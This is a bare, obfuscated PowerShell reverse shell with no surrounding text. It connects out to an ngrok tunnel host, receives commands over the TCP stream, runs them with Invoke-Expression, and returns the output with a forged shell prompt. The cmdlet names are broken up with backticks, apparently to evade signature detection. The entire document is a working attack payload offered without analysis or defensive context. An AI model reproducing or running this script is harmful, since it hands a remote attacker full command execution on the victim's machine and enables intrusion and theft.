$z=1;while($z-ne 0){switch($z){
  1{$c=n`ew-object net.sockets.tcpclient('0.tcp.ap.ngrok.io',10819);$g=$c.GetStream();$z=2}
  2{[byte[]]$b=0..65535|% {0};$z=3}
  3{if(($i=$g.Read($b,0,$b.Length))-ne 0){
      $t=[text.encoding]::ASCII.GetString($b,0,$i);
      $r=(i`ex $t 2>&1|out-string);
      $f=[text.encoding]::ASCII.GetBytes($r+"PS "+(gl).path+"> ");
      $g.Write($f,0,$f.Length);$z=3}else{$z=0}}
}}
